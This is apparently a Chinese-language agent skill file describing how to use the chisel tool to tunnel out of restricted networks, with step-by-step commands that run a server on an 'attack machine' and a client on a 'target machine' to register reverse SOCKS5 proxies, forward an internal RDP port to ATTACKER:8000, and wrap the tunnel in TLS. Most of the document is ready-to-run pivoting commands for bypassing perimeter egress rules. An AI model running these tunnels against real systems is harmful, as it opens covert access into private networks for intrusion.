---
name: as-chisel-tunnel
description: 使用 chisel 搭建 HTTP 隧道与 SOCKS5 代理进行内网穿透。当目标边界只放行 HTTP/HTTPS 出站流量、需要稳定的多端口转发或 SOCKS5 隧道时使用。chisel 基于 WebSocket 隧道，支持认证与 TLS，单二进制跨平台。
---

# chisel HTTP 隧道与内网穿透

chisel 通过单个 TCP 端口承载 WebSocket 隧道，把多条端口转发与 SOCKS5 代理复用在一条 HTTP 连接上，适合边界设备只放行 HTTP/HTTPS 出站的场景。项目地址：https://github.com/jpillora/chisel

## 核心概念

- **server**（服务端）：监听在攻击机或边界可达位置，接收隧道连接
- **client**（客户端）：运行在目标内网机器上，主动连接 server，把内网服务通过隧道暴露出来
- 全部转发由一条连接复用承载，新增转发不需要重新建立连接

## 基础用法

### 攻击机起 server，目标机起 client（反向 SOCKS5）

```bash
# 攻击机（VPS）：监听 8000，带认证
chisel server -p 8000 --auth user:pass --reverse

# 目标机（内网）：连接攻击机，注册反向 SOCKS5 到攻击机 1080
chisel client ATTACKER:8000 R:socks --auth user:pass

# 攻击机通过 127.0.0.1:1080 的 SOCKS5 即可访问目标内网
```

### 单个端口的反向转发

```bash
# 目标机：把攻击机 8443 反向映射到内网 10.0.0.2:3389
chisel client ATTACKER:8000 R:8443:10.0.0.2:3389 --auth user:pass

# 攻击机访问 127.0.0.1:8443 即连到内网 10.0.0.2:3389
```

### 正向 SOCKS5（目标机可直接访问时）

```bash
# 目标机：本地直接开 SOCKS5
chisel server -p 8000 --socks5

# 攻击机：proxychains 走 TARGET:8000
echo "socks5 TARGET 8000" >> /etc/proxychains.conf
```

### TLS 加密隧道

```bash
# 攻击机：server 自签证书
chisel server --tls-cert cert.pem --tls-key key.pem -p 8443 --reverse

# 目标机：client 校验指纹
chisel client ATTACKER:8443 --tls-ca-fingerprint SHA256_FP R:socks
```

## 场景选择

| 场景 | 推荐形态 |
|------|----------|
| 边界只放行 HTTP(S) 出站 | client 在目标侧，HTTP 隧道穿透 |
| 需要 SOCKS5 全内网代理 | `R:socks` 反向注册 |
| 只暴露单个内网服务 | `R:<port>:<target>:<port>` |
| 需要 HTTP 隧道内再转发 | server 侧 `--socks5` + client `R:multiple` |

## 排错

- 连接不通：先确认目标出站可达 server 端口（`curl http://ATTACKER:8000`）
- `--reverse` 必须在 server 侧启用，否则 client 的 R: 注册被拒绝
- 代理慢：chisel 单连接复用在大量并发 TCP 时有开销，长跑任务改用 iox/frp 的多连接形态
